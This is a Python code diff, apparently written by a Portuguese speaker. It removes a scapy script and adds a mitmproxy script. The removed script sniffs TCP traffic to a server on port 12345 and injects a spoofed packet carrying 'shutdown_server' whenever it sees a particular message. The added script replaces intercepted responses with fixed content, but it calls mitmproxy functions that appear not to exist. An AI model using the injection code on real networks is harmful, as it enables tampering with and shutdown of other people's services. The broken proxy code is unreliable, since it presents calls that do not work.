@@ -1,22 +1,13 @@
-from scapy.all import *
-from scapy.layers.inet import TCP, IP
+from mitmproxy import http
+from mitmproxy import ctx
 
+def request(flow: http.HTTPFlow):
+    print(f"Interceptando requisição para: {flow.request.host}")
+    flow.response = http.HTTPFlow.from_flow(flow)
+    flow.response.headers['X-My-Header'] = 'Test'
+    flow.response.content = b"HeHe"
 
-def intercept(pkt):
-    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
-        payload = pkt[Raw].load.decode(errors="ignore")
+def start_proxy():
+    ctx.start_tcp_proxy("192.168.0.100", 12345)
 
-        if "mensagem_legitima" in payload:
-            print(f"[!] Interceptado: {payload}")
-
-            spoofed = IP(dst=pkt[IP].dst, src=pkt[IP].src) / \
-                      TCP(dport=pkt[TCP].dport, sport=pkt[TCP].sport,
-                          flags="PA", seq=pkt[TCP].seq, ack=pkt[TCP].ack) / \
-                      Raw(load="shutdown_server\n")
-
-            send(spoofed, verbose=0)
-            print("[+] Mensagem alterada e reenviada.")
-
-
-print("[*] Sniffando pacotes para o servidor 192.168.1.10:12345...")
-sniff(filter="tcp dst host 192.168.1.10 and port 12345", prn=intercept, store=0)
+start_proxy()
